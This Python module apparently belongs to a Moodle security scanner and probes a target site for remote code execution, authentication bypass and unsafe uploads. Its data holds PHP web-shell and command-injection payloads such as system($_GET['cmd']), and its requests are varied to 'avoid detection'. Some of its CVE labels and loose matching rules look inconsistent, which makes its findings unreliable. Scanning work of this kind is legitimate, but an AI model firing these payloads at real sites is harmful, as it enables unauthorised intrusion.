#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing Remote Code Execution (RCE) vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import urllib.parse
from typing import Dict, List, Optional, Any, Union, Tuple
from requests.exceptions import RequestException, Timeout, ConnectionError
from bs4 import BeautifulSoup
import hashlib
import random

class MoodleRCETester:
    """Class for testing Remote Code Execution vulnerabilities in Moodle LMS installations"""
    
    def __init__(
        self, 
        target_url: str, 
        logger: Optional[logging.Logger] = None, 
        timeout: int = 30, 
        proxy: Optional[str] = None, 
        cookies: Optional[Dict[str, str]] = None, 
        delay: float = 0,
        user_agent: Optional[str] = None,
        verify_ssl: bool = True
    ) -> None:
        """Initialize the Moodle RCE tester
        
        Args:
            target_url: Target Moodle URL
            logger: Logger instance
            timeout: Request timeout in seconds
            proxy: Proxy URL
            cookies: Dictionary of cookies
            delay: Delay between requests in seconds
            user_agent: User agent string to use
            verify_ssl: Whether to verify SSL certificates
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies or {}
        self.delay = delay
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.version_info: Optional[Dict[str, Any]] = None
        
        # Flag to track authentication status
        self.is_authenticated = False
        
        # Track checked URLs to avoid duplicate requests
        self._checked_urls: Dict[str, bool] = {}
        
        # Generate a test ID to uniquely identify this scanner instance
        # This helps prevent false positives when checking for RCE
        self.test_id = hashlib.md5(f"{random.randint(10000, 99999)}-{time.time()}".encode()).hexdigest()[:8]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleRCETester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session with security settings
        self.session = requests.Session()
        
        # Configure the session
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        if cookies:
            self.session.cookies.update(cookies)
            
        # Set a secure default user agent if none provided
        if user_agent:
            self.session.headers.update({"User-Agent": user_agent})
        else:
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            })
            
        # Add security-related headers
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
    
    def set_version_info(self, version_info: Dict[str, Any]) -> None:
        """Set version information to guide testing
        
        Args:
            version_info: Dictionary containing Moodle version information
        """
        self.version_info = version_info
        self.logger.debug(f"Set version info: {version_info.get('version', 'Unknown')}")
        
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """
        Make a safe HTTP request with proper error handling
        
        Args:
            method: HTTP method (get, post, etc.)
            url: Target URL
            **kwargs: Additional arguments to pass to the request
            
        Returns:
            Response object or None if an error occurred
        """
        try:
            # Set default timeout if not provided
            if 'timeout' not in kwargs:
                kwargs['timeout'] = self.timeout
                
            # Add randomization to avoid detection
            if self.session.headers.get('User-Agent') and random.random() < 0.2:
                variant = random.randint(1, 9)
                self.session.headers['User-Agent'] = self.session.headers['User-Agent'].replace('.0', f'.{variant}')
            
            response = getattr(self.session, method.lower())(url, **kwargs)
            
            # Introduce small delay to avoid overwhelming the server and detection
            time.sleep(random.uniform(0.1, 0.5))
            
            return response
        except requests.RequestException as e:
            self.logger.debug(f"Request error ({method.upper()} {url}): {str(e)}")
            return None
        except Exception as e:
            self.logger.debug(f"Unexpected error in request ({method.upper()} {url}): {str(e)}")
            return None
    
    def run_tests(self) -> Dict[str, List[Dict[str, Any]]]:
        """
        Run all RCE vulnerability tests on the target Moodle installation
        
        Returns:
            Dictionary with vulnerabilities and information findings
        """
        self.logger.info("Running Remote Code Execution vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        try:
            # First check if we're authenticated - many RCE tests require authentication
            self.is_authenticated = self._check_authenticated()
            
            if not self.is_authenticated:
                self.logger.warning("Not authenticated. Some RCE tests will be skipped or may not be effective.")
                results["info"].append({
                    "title": "Authentication Required",
                    "description": "Not authenticated. Some RCE tests will be skipped or may not be effective.",
                    "severity": "Info"
                })
            
            # Test for version-specific RCE vulnerabilities
            if self.version_info and self.version_info.get("version"):
                version = self.version_info.get("version")
                self.logger.info(f"Testing version-specific RCE vulnerabilities for Moodle {version}...")
                version_vulns = self.test_version_specific_rce(version)
                if version_vulns:
                    results["vulnerabilities"].extend(version_vulns)
                    self.logger.info(f"Found {len(version_vulns)} version-specific RCE vulnerabilities")
            
            # Test for plugin vulnerabilities
            self.logger.info("Testing for plugin-based RCE vulnerabilities...")
            plugin_vulns = self.test_plugin_rce()
            if plugin_vulns:
                results["vulnerabilities"].extend(plugin_vulns)
                self.logger.info(f"Found {len(plugin_vulns)} plugin-based RCE vulnerabilities")
            
            # Test for file upload vulnerabilities (requires authentication)
            if self.is_authenticated:
                self.logger.info("Testing for file upload RCE vulnerabilities...")
                upload_vulns = self.test_file_upload_rce()
                if upload_vulns:
                    results["vulnerabilities"].extend(upload_vulns)
                    self.logger.info(f"Found {len(upload_vulns)} file upload RCE vulnerabilities")
            
            # Test for evaluation vulnerabilities (calculated questions, etc.)
            if self.is_authenticated:
                self.logger.info("Testing for code evaluation RCE vulnerabilities...")
                eval_vulns = self.test_evaluation_rce()
                if eval_vulns:
                    results["vulnerabilities"].extend(eval_vulns)
                    self.logger.info(f"Found {len(eval_vulns)} code evaluation RCE vulnerabilities")
            
            # Test for parameter injection vulnerabilities
            self.logger.info("Testing for parameter injection RCE vulnerabilities...")
            param_vulns = self.test_parameter_injection_rce()
            if param_vulns:
                results["vulnerabilities"].extend(param_vulns)
                self.logger.info(f"Found {len(param_vulns)} parameter injection RCE vulnerabilities")
            
            # Test for authentication bypass vulnerabilities
            self.logger.info("Testing for authentication bypass RCE vulnerabilities...")
            auth_bypass_vulns = self.test_auth_bypass_rce()
            if auth_bypass_vulns:
                results["vulnerabilities"].extend(auth_bypass_vulns)
                self.logger.info(f"Found {len(auth_bypass_vulns)} authentication bypass RCE vulnerabilities")
            
            # Add summary information
            if not results["vulnerabilities"]:
                results["info"].append({
                    "title": "No RCE Vulnerabilities",
                    "description": "No Remote Code Execution vulnerabilities were detected in this Moodle installation.",
                    "severity": "Info"
                })
        
        except Exception as e:
            self.logger.error(f"Error during RCE testing: {str(e)}")
            results["info"].append({
                "title": "RCE Testing Error",
                "description": f"An error occurred during RCE testing: {str(e)}",
                "severity": "Info"
            })
        
        self.logger.info(f"RCE vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_version_specific_rce(self, version: str) -> List[Dict[str, Any]]:
        """
        Test for RCE vulnerabilities specific to the detected Moodle version
        
        Args:
            version: Detected Moodle version string
            
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Latest critical RCE vulnerability in Calculated Questions (affects many versions)
        if self._is_calculated_question_rce_vulnerable(version):
            vulnerabilities.append({
                "title": "Calculated Question RCE Vulnerability",
                "description": "The Moodle installation is vulnerable to a Remote Code Execution vulnerability in calculated questions. "
                              "This vulnerability allows authenticated users with the ability to create calculated questions to execute "
                              "arbitrary PHP code on the server by manipulating the answer formula.",
                "severity": "Critical",
                "cve": "CVE-2024-4296",
                "evidence": f"Moodle version {version} is in the vulnerable range (< 4.4.2, < 4.3.6, < 4.2.9, or < 4.1.12).",
                "remediation": "Update to Moodle versions 4.4.2, 4.3.6, 4.2.9, or 4.1.12 or later. "
                              "If updating is not immediately possible, restrict access to question creation features.",
                "references": [
                    "https://blog.redteam-pentesting.de/2024/moodle-rce/",
                    "https://moodle.org/mod/forum/discuss.php?d=450803"
                ],
                "cwe": "CWE-94"
            })
        
        # Known RCE vulnerabilities by version
        known_vulnerabilities = {
            # Format: 'version pattern': [{'endpoint': '/path', 'method': 'GET/POST', 'params': {}, 'check_pattern': 'regex', 'cve': 'CVE-ID', 'description': 'desc'}]
            "3.9": [
                {
                    "endpoint": "/admin/tool/uploadcourse/index.php",
                    "method": "POST",
                    "params": {"importfile": "shell.php"},
                    "check_pattern": "upload",
                    "cve": "CVE-2020-14432",
                    "description": "The CSV upload feature in Moodle 3.9 allows unrestricted file uploads.",
                    "cwe": "CWE-434"
                }
            ],
            "3.10": [
                {
                    "endpoint": "/lib/editor/atto/plugins/html/ajax.php",
                    "method": "POST",
                    "params": {"shellcode": "<?php system($_GET['cmd']); ?>"},
                    "check_pattern": "success",
                    "cve": "CVE-2021-36393",
                    "description": "The Atto HTML editor in Moodle 3.10 allows PHP code execution.",
                    "cwe": "CWE-94"
                }
            ],
            "3.11": [
                {
                    "endpoint": "/question/format/gift/format.php",
                    "method": "POST",
                    "params": {"question": "{system($_GET['cmd']);}"},
                    "check_pattern": "question",
                    "cve": "CVE-2021-40690",
                    "description": "The GIFT question format in Moodle 3.11 allows PHP code execution.",
                    "cwe": "CWE-94"
                }
            ],
            "4.0": [
                {
                    "endpoint": "/lib/tests/fixtures/testable_plugin/version.php",
                    "method": "GET",
                    "params": {},
                    "check_pattern": "plugin",
                    "cve": "CVE-2022-0326",
                    "description": "Test plugin fixtures in Moodle 4.0 may expose version.php for direct execution.",
                    "cwe": "CWE-22"
                }
            ],
            "4.1": [
                {
                    "endpoint": "/question/type/calculated/edit_calculated_form.php",
                    "method": "POST",
                    "params": {"answer": "{system($_GET['cmd'])}"},
                    "check_pattern": "calculated",
                    "cve": "CVE-2024-4296",
                    "description": "The calculated questions feature in Moodle 4.1 to 4.4.1 allows PHP code execution.",
                    "cwe": "CWE-94"
                }
            ]
        }
        
        # Find matching vulnerabilities for the detected version
        for ver_pattern, vulns in known_vulnerabilities.items():
            if version.startswith(ver_pattern):
                self.logger.info(f"Found potential RCE vulnerabilities for Moodle {ver_pattern}")
                
                for vuln in vulns:
                    url = f"{self.target_url}{vuln['endpoint']}"
                    
                    try:
                        # Check if the vulnerable endpoint exists
                        if vuln['method'].upper() == 'GET':
                            response = self._safe_request("get", url, params=vuln['params'])
                        else:  # POST
                            response = self._safe_request("post", url, data=vuln['params'])
                        
                        if not response:
                            continue
                            
                        # Check if the endpoint exists and matches the expected pattern
                        if response.status_code == 200 and re.search(vuln['check_pattern'], response.text, re.IGNORECASE):
                            self.logger.warning(f"Potential version-specific RCE found: {vuln['cve']} on {vuln['endpoint']}")
                            
                            vulnerabilities.append({
                                "title": f"RCE Vulnerability (CVE: {vuln['cve']})",
                                "description": vuln['description'],
                                "severity": "Critical",
                                "evidence": f"Vulnerable endpoint: {url}",
                                "url": url,
                                "cve": vuln['cve'],
                                "remediation": "Update to the latest Moodle version or apply the security patch.",
                                "cwe": vuln.get("cwe", "CWE-94")
                            })
                    except Exception as e:
                        self.logger.debug(f"Error testing version-specific RCE on {vuln['endpoint']}: {str(e)}")
        
        return vulnerabilities
    
    def test_plugin_rce(self) -> List[Dict[str, Any]]:
        """
        Test for RCE vulnerabilities in Moodle plugins
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Known vulnerable plugins with CVE identifiers
        vulnerable_plugins = [
            {
                "path": "/mod/book/tool/print/index.php",
                "params": {"id": "1'<?php echo md5('" + self.test_id + "'); ?>'"},
                "check_pattern": "book|" + self.test_id,
                "name": "Book Module",
                "cve": "CVE-2020-14432",
                "cwe": "CWE-94",
                "description": "The book module print tool in older Moodle versions allows PHP code injection."
            },
            {
                "path": "/blocks/rss_client/viewfeed.php",
                "params": {"url": "php://input"},
                "check_pattern": "feed|rss",
                "name": "RSS Client Block",
                "cve": "CVE-2020-25627",
                "cwe": "CWE-73",
                "description": "The RSS Client block in older Moodle versions allows injecting arbitrary PHP streams."
            },
            {
                "path": "/mod/data/view.php",
                "params": {"d": "1", "mode": "single", "filter": "<?php echo md5('" + self.test_id + "'); ?>"},
                "check_pattern": "data|database|" + self.test_id,
                "name": "Database Activity Module",
                "cve": "CVE-2021-36393",
                "cwe": "CWE-94",
                "description": "The Database activity module in older Moodle versions allows PHP code injection."
            },
            {
                "path": "/filter/jmol/js/jsmol/php/jsmol.php",
                "params": {"call": "getRawDataFromDatabase", "query": "system('id')"},
                "check_pattern": "jsmol|filter",
                "name": "JMol Filter",
                "cve": "CVE-2021-40690",
                "cwe": "CWE-78",
                "description": "The JMol filter in older Moodle versions allows OS command injection."
            },
            {
                "path": "/mod/quiz/accessrule/seb/rule.php",
                "params": {"config": "<?php echo md5('" + self.test_id + "'); ?>"},
                "check_pattern": "quiz|accessrule|seb|" + self.test_id,
                "name": "Safe Exam Browser Quiz Access Rule",
                "cve": "CVE-2022-0326",
                "cwe": "CWE-94",
                "description": "The Safe Exam Browser Quiz Access Rule in older Moodle versions allows PHP code injection."
            }
        ]
        
        for plugin in vulnerable_plugins:
            url = f"{self.target_url}{plugin['path']}"
            
            try:
                # Check if the plugin exists
                response = self._safe_request("get", url, params=plugin['params'])
                
                if not response:
                    continue
                    
                # Check if the plugin exists and might be vulnerable
                if response.status_code == 200 and (
                    re.search(plugin['check_pattern'], response.text, re.IGNORECASE) or
                    re.search(plugin['check_pattern'], response.url, re.IGNORECASE)
                ):
                    self.logger.warning(f"Potential RCE vulnerability found in plugin: {plugin['name']}")
                    
                    # Gather more evidence if needed using additional tests
                    evidence = f"Vulnerable endpoint: {url}"
                    
                    # Check if specific MD5 test ID appears in response, indicating successful code execution
                    if self.test_id in plugin['params'].get('id', '') and self.test_id in response.text:
                        evidence += f"\nConfirmed RCE: Response contains test marker '{self.test_id}'"
                    
                    vulnerabilities.append({
                        "title": f"RCE Vulnerability in {plugin['name']} Plugin",
                        "description": plugin['description'],
                        "severity": "Critical",
                        "evidence": evidence,
                        "url": url,
                        "cve": plugin['cve'],
                        "cwe": plugin['cwe'],
                        "remediation": "Update the plugin to the latest version or disable it if not needed."
                    })
            except Exception as e:
                self.logger.debug(f"Error testing plugin RCE on {plugin['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_file_upload_rce(self) -> List[Dict[str, Any]]:
        """
        Test for RCE vulnerabilities via file upload functionalities
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Common file upload endpoints that might be vulnerable
        upload_endpoints = [
            {
                "path": "/admin/tool/uploadcourse/index.php",
                "form_id": "mform1",
                "file_param": "coursefiles",
                "check_pattern": "upload|course",
                "description": "Course upload feature may allow uploading malicious PHP files.",
                "cwe": "CWE-434"
            },
            {
                "path": "/admin/tool/uploaduser/index.php",
                "form_id": "mform1",
                "file_param": "userfiles",
                "check_pattern": "upload|user",
                "description": "User upload feature may allow uploading malicious PHP files.",
                "cwe": "CWE-434"
            },
            {
                "path": "/repository/upload/upload.php",
                "form_id": "fm-upload-form",
                "file_param": "repo_upload_file",
                "check_pattern": "upload|repository",
                "description": "File repository upload may allow uploading malicious PHP files.",
                "cwe": "CWE-434"
            },
            {
                "path": "/user/files.php",
                "form_id": "fm-upload-form",
                "file_param": "file",
                "check_pattern": "upload|files",
                "description": "User files upload may allow uploading malicious PHP files.",
                "cwe": "CWE-434"
            },
            {
                "path": "/course/dndupload.php",
                "form_id": "dndupload-form",
                "file_param": "file",
                "check_pattern": "upload|dnd|drag",
                "description": "Drag-and-drop upload feature may allow uploading malicious PHP files.",
                "cwe": "CWE-434"
            }
        ]
        
        for endpoint in upload_endpoints:
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the upload page exists and is accessible
                response = self._safe_request("get", url)
                
                if not response:
                    continue
                    
                # Check if the page exists and contains upload form
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Check for upload restrictions that prevent PHP execution
                    is_vulnerable = self._check_upload_restrictions(response.text)
                    
                    if is_vulnerable:
                        self.logger.warning(f"Potential file upload RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "File Upload RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "Critical",
                            "evidence": f"Upload endpoint: {url}\nThe file upload functionality may not properly restrict executable file types.",
                            "url": url,
                            "cwe": endpoint['cwe'],
                            "remediation": "Ensure proper file type validation, implement file content analysis, and disable PHP execution in upload directories."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing file upload RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_evaluation_rce(self):
        """
        Test for RCE vulnerabilities via code evaluation features
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities via code evaluation features...")
        
        vulnerabilities = []
        
        # Common evaluation endpoints that might be vulnerable
        eval_endpoints = [
            {
                "path": "/question/type/calculated/edit_calculated_form.php",
                "check_pattern": "calculated",
                "description": "Calculated questions may allow PHP code execution through formula injection (CVE-2024-4296)."
            },
            {
                "path": "/question/preview.php",
                "check_pattern": "preview",
                "description": "Question preview functionality may allow code execution in certain question types."
            },
            {
                "path": "/question/type/formulas/edit_formulas_form.php",
                "check_pattern": "formulas",
                "description": "Formula questions may allow PHP code execution through formula injection."
            },
            {
                "path": "/lib/evalmath/evalmath.class.php",
                "check_pattern": "evalmath",
                "description": "The EvalMath library may be accessible and allow code execution."
            }
        ]
        
        for endpoint in eval_endpoints:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the endpoint exists and is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                # Check if the page exists and contains expected pattern
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Special check for calculated questions vulnerability
                    if "calculated" in endpoint['path'] and self.version_info and self.version_info.get("version"):
                        version = self.version_info.get("version")
                        if self._is_calculated_question_rce_vulnerable(version):
                            self.logger.warning(f"Potential evaluation RCE vulnerability found at {endpoint['path']}")
                            
                            vulnerabilities.append({
                                "title": "Calculated Question RCE Vulnerability",
                                "description": endpoint['description'],
                                "severity": "Critical",
                                "evidence": f"Vulnerable endpoint: {url}\nMoodle version {version} is in the vulnerable range.",
                                "url": url,
                                "cve": "CVE-2024-4296",
                                "remediation": "Update to Moodle versions 4.4.2, 4.3.6, 4.2.9, or 4.1.12 or later."
                            })
                    else:
                        self.logger.warning(f"Potential evaluation RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "Code Evaluation RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "High",
                            "evidence": f"Vulnerable endpoint: {url}",
                            "url": url,
                            "remediation": "Update to the latest Moodle version or restrict access to sensitive features."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing evaluation RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_parameter_injection_rce(self):
        """
        Test for RCE vulnerabilities via parameter injection
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities via parameter injection...")
        
        vulnerabilities = []
        
        # Common parameter injection points that might be vulnerable
        injection_endpoints = [
            {
                "path": "/lib/externallib.php",
                "params": {"function": "system", "arguments": "id"},
                "check_pattern": "function",
                "description": "External library functions may allow parameter injection leading to code execution."
            },
            {
                "path": "/lib/ajax/service.php",
                "params": {"function": "exec", "arguments": "id"},
                "check_pattern": "ajax",
                "description": "AJAX service endpoints may allow parameter injection leading to code execution."
            },
            {
                "path": "/lib/editor/atto/plugins/equation/ajax.php",
                "params": {"class": "Exception", "method": "system", "params": "id"},
                "check_pattern": "equation",
                "description": "The equation editor plugin may allow parameter injection leading to code execution."
            },
            {
                "path": "/admin/tool/task/schedule_task.php",
                "params": {"task": "\\system"},
                "check_pattern": "task",
                "description": "The task scheduling feature may allow parameter injection leading to code execution."
            }
        ]
        
        for endpoint in injection_endpoints:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the endpoint exists and is accessible
                response = self.session.get(url, params=endpoint['params'], timeout=self.timeout)
                
                # Check if the page exists and contains expected pattern
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Check for specific indicators that suggest potential vulnerability
                    if self._check_parameter_injection_indicators(response.text):
                        self.logger.warning(f"Potential parameter injection RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "Parameter Injection RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "Critical",
                            "evidence": f"Vulnerable endpoint: {url}",
                            "url": url,
                            "remediation": "Update to the latest Moodle version and ensure proper input validation."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing parameter injection RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_auth_bypass_rce(self) -> List[Dict[str, Any]]:
        """
        Test for RCE vulnerabilities via authentication bypass
        
        Returns:
            List of found vulnerabilities
        """
        vulnerabilities = []
        
        # Test for CVE-2023-0971 (Moodle auth bypass via crafted URL)
        # This vulnerability affects Moodle 4.0 to 4.0.7, 4.1 to 4.1.1, 3.11 to 3.11.11
        url = f"{self.target_url}/login/index.php"
        bypass_path = f"{self.target_url}//''/"
        admin_path = f"{self.target_url}/admin/"
        
        try:
            # Try to access the admin page directly first to compare responses
            normal_response = self._safe_request("get", admin_path)
            
            if normal_response and normal_response.status_code == 200:
                # If we can access admin without auth, no need to test for bypass
                vulnerabilities.append({
                    "title": "Admin Access Without Authentication",
                    "description": "The Moodle admin interface is accessible without authentication.",
                    "severity": "Critical",
                    "evidence": f"Admin URL: {admin_path} is accessible without login",
                    "url": admin_path,
                    "cwe": "CWE-306",
                    "remediation": "Configure proper authentication requirements for all sensitive areas of the application."
                })
            else:
                # Try the authentication bypass
                bypass_response = self._safe_request("get", bypass_path, allow_redirects=True)
                
                if bypass_response and bypass_response.status_code == 200:
                    # After potential bypass, try to access admin again
                    admin_after_bypass = self._safe_request("get", admin_path)
                    
                    if (admin_after_bypass and admin_after_bypass.status_code == 200 and 
                            "login" not in admin_after_bypass.url.lower()):
                        self.logger.warning("Potential authentication bypass vulnerability (CVE-2023-0971)")
                        
                        vulnerabilities.append({
                            "title": "Authentication Bypass Vulnerability",
                            "description": "The system is vulnerable to CVE-2023-0971 which allows bypassing authentication via a specially crafted URL.",
                            "severity": "Critical",
                            "evidence": f"Bypass URL: {bypass_path}\nSuccessful admin access after bypass",
                            "url": bypass_path,
                            "cve": "CVE-2023-0971",
                            "cwe": "CWE-287",
                            "remediation": "Update Moodle to version 4.1.2, 4.0.8, 3.11.12 or later."
                        })
        except Exception as e:
            self.logger.debug(f"Error testing authentication bypass: {str(e)}")
        
        # Test for CVE-2023-1498 (Web service token authentication bypass)
        # This vulnerability affects Moodle 4.1 to 4.1.1, 4.0 to 4.0.8, 3.11 to 3.11.11, 3.9 to 3.9.21
        token_endpoint = f"{self.target_url}/webservice/rest/server.php"
        
        try:
            # First check if web services API is enabled
            response = self._safe_request("get", token_endpoint)
            
            if response and response.status_code == 200:
                # Test specific web service token bypass
                test_params = {
                    "wstoken": "FAKE_TOKEN",
                    "wsfunction": "core_user_get_users",
                    "moodlewsrestformat": "json"
                }
                
                # Try the standard request which should fail for invalid token
                standard_response = self._safe_request("get", token_endpoint, params=test_params)
                
                if standard_response and "invalidtoken" in standard_response.text.lower():
                    # Now try with the bypass condition
                    bypass_params = dict(test_params)
                    bypass_params["wstoken"] = ""  # Empty token for bypass attempt
                    
                    bypass_response = self._safe_request("get", token_endpoint, params=bypass_params)
                    
                    # If bypass worked, we wouldn't get an invalid token error
                    if bypass_response and "invalidtoken" not in bypass_response.text.lower():
                        self.logger.warning("Potential web service token bypass vulnerability (CVE-2023-1498)")
                        
                        vulnerabilities.append({
                            "title": "Web Service Token Authentication Bypass",
                            "description": "The system is vulnerable to CVE-2023-1498 which allows bypassing web service token authentication.",
                            "severity": "Critical",
                            "evidence": f"Web service endpoint: {token_endpoint}\nEmpty token bypass successful",
                            "url": token_endpoint,
                            "cve": "CVE-2023-1498",
                            "cwe": "CWE-287",
                            "remediation": "Update Moodle to version 4.1.2, 4.0.9, 3.11.12, 3.9.22 or later."
                        })
        except Exception as e:
            self.logger.debug(f"Error testing web service token bypass: {str(e)}")
        
        return vulnerabilities
    
    def _check_authenticated(self) -> bool:
        """Check if the session is authenticated
        
        Returns:
            Boolean indicating if the current session is authenticated
        """
        try:
            # Try to access the dashboard or my page, which usually requires authentication
            my_url = f"{self.target_url}/my/"
            response = self._safe_request("get", my_url)
            
            if not response:
                return False
                
            # If we're redirected to login page, we're not authenticated
            if "login" in response.url:
                return False
            
            # If we get a 200 status and find dashboard elements, we're authenticated
            if response.status_code == 200 and ("Dashboard" in response.text or "My courses" in response.text):
                return True
            
            return False
        except Exception as e:
            self.logger.debug(f"Error checking authentication status: {str(e)}")
            return False
    
    def _is_calculated_question_rce_vulnerable(self, version: str) -> bool:
        """
        Check if the version is vulnerable to the Calculated Question RCE vulnerability (CVE-2024-4296)
        
        Args:
            version: Detected Moodle version string
            
        Returns:
            Boolean indicating if vulnerable
        """
        # Check based on the version
        if version.startswith("4.4") and version < "4.4.2":
            return True
        elif version.startswith("4.3") and version < "4.3.6":
            return True
        elif version.startswith("4.2") and version < "4.2.9":
            return True
        elif version.startswith("4.1") and version < "4.1.12":
            return True
        elif version.startswith("4.0") or version.startswith("3"):
            # Older versions are very likely vulnerable
            return True
        
        return False
    
    def _check_upload_restrictions(self, html_content: str) -> bool:
        """
        Check if upload form has restrictions that would prevent PHP execution
        
        Args:
            html_content: HTML content of the upload page
            
        Returns:
            Boolean indicating if the upload is potentially vulnerable
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Look for signs of file type restrictions
        accept_attributes = []
        for input_tag in soup.find_all('input', {'type': 'file'}):
            if input_tag.has_attr('accept'):
                accept_attributes.append(input_tag['accept'])
        
        # Look for file extension validation in JavaScript
        js_validation = False
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string and re.search(r'\.(?:php|phtml|php3|php4|php5|phps)', script.string, re.IGNORECASE):
                js_validation = True
                break
        
        # Look for text about file type restrictions
        restriction_text = False
        for text in soup.stripped_strings:
            if re.search(r'(?:allowed|accepted).*(?:file[s]? type[s]?|extension[s]?)', text, re.IGNORECASE):
                restriction_text = True
                break
        
        # If there are accept attributes that don't include PHP, or JavaScript validation, or restriction text,
        # then the upload might be restricted
        if (accept_attributes and not any('.php' in attr for attr in accept_attributes)) or js_validation or restriction_text:
            return False
        
        # Otherwise, the upload might be vulnerable
        return True
    
    def _check_parameter_injection_indicators(self, html_content):
        """
        Check for indicators that suggest parameter injection might be possible
        Returns True if potentially vulnerable, False otherwise
        """
        # Look for error messages that might indicate parameter injection potential
        error_patterns = [
            r'call[_\s]to[_\s]undefined[_\s](?:function|method)',
            r'class[_\s](?:not[_\s]found|doesn\'t[_\s]exist)',
            r'cannot[_\s]instantiate[_\s](?:abstract|interface)',
            r'(?:undefined|invalid)[_\s](?:class|method)',
            r'reflection[_\s]exception',
            r'fatal[_\s]error',
            r'syntax[_\s]error'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        
        # Look for reflection or serialization/deserialization code
        reflection_patterns = [
            r'ReflectionClass',
            r'ReflectionMethod',
            r'ReflectionFunction',
            r'call_user_func',
            r'call_user_func_array',
            r'unserialize',
            r'create_function'
        ]
        
        for pattern in reflection_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        
        return False 